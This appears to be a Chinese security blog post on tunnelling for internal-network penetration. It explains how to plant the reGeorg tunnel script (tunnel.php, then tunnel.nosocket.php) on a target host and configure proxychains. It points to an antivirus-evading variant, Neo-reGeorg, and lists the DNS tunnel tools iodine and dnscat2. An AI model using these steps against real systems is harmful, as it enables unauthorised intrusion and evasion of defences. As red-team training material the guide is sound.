+<h2><span id="http协议-regeorg隧道">HTTP协议 —reGeorg隧道</span></h2><p>reGeorg 简介<br>隧道工具  — reGeorg<br><a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682405123769-88b3c597-228c-4cd2-9221-63fb5805e2ef.png#averageHue=%2311151c&clientId=u1245d558-44d5-4&from=paste&height=484&id=ue8977923&name=image.png&originHeight=968&originWidth=1924&originalType=binary&ratio=2&rotation=0&showTitle=false&size=151775&status=done&style=none&taskId=u81ab92cc-66fa-43bd-af42-3b2d4527692&title=&width=962" alt="image.png"><br>reGeorg 是一个内网穿透工具，基于 socks5，而且支持众多脚本。因为使用频繁，所以较多的杀软都会拦截，需要做免杀处理。<br>免杀 版本reG 下载地址：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br>此工具还做了加密，所以很多特征都没有了<br>——————————————————————————————————————-<br>把其中的脚本放在目标主机上 <br>这里把 tunnel.php 放在目标主机中 ，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682405732996-b01b5ba7-8ac0-4b44-8718-4f667f23a2b7.png#averageHue=%23fdfbfa&clientId=u1245d558-44d5-4&from=paste&height=119&id=u65304111&name=image.png&originHeight=237&originWidth=616&originalType=binary&ratio=2&rotation=0&showTitle=false&size=17193&status=done&style=none&taskId=u8dc5955e-eaf9-42f2-bee4-55dbd1c5fd3&title=&width=308" alt="image.png"><br>这个文件似乎有点问题 换成 tunnel.nosocket.php  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682406412534-833c046d-2d76-4235-9b0f-f7525be99956.png#averageHue=%23242732&clientId=u1245d558-44d5-4&from=paste&height=185&id=ue027818f&name=image.png&originHeight=370&originWidth=1005&originalType=binary&ratio=2&rotation=0&showTitle=false&size=112540&status=done&style=none&taskId=u6bd77f54-d0de-4439-869d-d7cea076645&title=&width=502.5" alt="image.png"><br>连接上了 <br>配置socks代理 <br> vim &#x2F;etc&#x2F;proxychains4.conf <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682407176041-7cec558b-3a07-4362-a456-f0ca4b7d93a8.png#averageHue=%23232633&clientId=u52ac2783-1a14-4&from=paste&height=91&id=u9a0abba9&name=image.png&originHeight=182&originWidth=606&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28083&status=done&style=none&taskId=u49077a5f-4d7a-4f45-a995-c07cba14372&title=&width=303" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682407161620-3f07d9d8-20b4-404d-a507-ab27efed5ed6.png#averageHue=%23252834&clientId=u52ac2783-1a14-4&from=paste&height=229&id=uefe5733b&name=image.png&originHeight=457&originWidth=974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=167939&status=done&style=none&taskId=u7020fd8d-f378-45c4-a581-b324526ddff&title=&width=487" alt="image.png"></p>
+<p>成功执行</p>
+<p><a name="dKnFH"></a></p>
+<h2><span id="dns-隧道工具">DNS 隧道工具</span></h2><p>iodine ： <br><a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a><br>dnscat：<br><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
+<p><a name="Kz5yM"></a></p>
+<h1><span id="隧道技术的优势和劣势">隧道技术的优势和劣势</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682412984682-e93a1d6d-8406-40cb-b4e8-9937cf4d1988.png#averageHue=%23d4ddde&clientId=ua9469c0c-7088-4&from=paste&height=325&id=ueb2fb888&name=image.png&originHeight=325&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=false&size=219885&status=done&style=none&taskId=u5b4a17c0-0ffe-4b31-995b-ed6bc2c6d92&title=&width=811" alt="image.png"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/10/ATT&CK%20(%E4%B8%80)/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>ATT&CK红队评估(一)</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/04/10/%E4%B8%80%E4%B8%AA%E8%BF%90%E6%B0%94%E8%AF%81%E4%B9%A6%E7%AB%99%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      一个运气证书站的挖掘
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="post-tag">#内网穿透</a><a href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="post-tag">#端口转发</a><a href="/tags/%E5%BA%94%E7%94%A8%E5%B1%82-%E7%BD%91%E7%BB%9C%E5%B1%82-%E4%BC%A0%E8%BE%93%E5%B1%82/" class="post-tag">#应用层,网络层,传输层</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
